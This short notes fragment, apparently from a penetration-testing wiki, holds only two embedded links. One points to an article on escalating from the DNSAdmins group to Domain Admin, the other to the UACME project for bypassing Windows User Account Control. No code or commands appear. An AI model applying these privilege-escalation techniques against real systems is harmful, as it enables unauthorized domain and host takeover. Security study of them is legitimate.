{% embed url="https://adsecurity.org/?p=4064" %} From DNSAdmins to Domain Admin, When DNSAdmins is More than Just DNS Administration{% endembed %}  
{% embed url="https://github.com/hfiref0x/UACME" %} Defeating Windows User Account Control by abusing built-in Windows AutoElevate backdoor - hfiref0x {% endembed %}  
